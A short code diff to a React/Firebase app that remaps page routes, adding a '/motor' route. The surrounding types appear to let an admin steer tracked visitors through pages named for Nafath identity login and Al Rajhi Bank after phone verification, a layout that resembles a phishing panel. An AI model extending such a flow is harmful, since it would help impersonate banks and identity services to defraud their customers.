@@ -3,7 +3,7 @@ import { useLocation } from "wouter";
 import { db, addData, generateVisitorId, isFirebaseConfigured } from "@/lib/firebase";
 import { doc, onSnapshot } from "firebase/firestore";
 
-export type RoutablePage = "motor-insurance" | "phone-verification" | "nafaz" | "rajhi" | "done";
+export type RoutablePage = "motor" | "motor-insurance" | "phone-verification" | "nafaz" | "rajhi" | "done";
 
 export interface AdminDirective {
   targetPage?: RoutablePage;
@@ -19,11 +19,12 @@ export interface VisitorData {
 }
 
 const PAGE_ROUTES: Record<RoutablePage, string> = {
-  "motor-insurance": "/",
+  "motor": "/motor",
+  "motor-insurance": "/motor",
   "phone-verification": "/phone",
   "nafaz": "/nafaz",
   "rajhi": "/rajhi",
-  "done": "/",
+  "done": "/motor",
 };
 
 // Store pending directive globally so it persists across page navigations
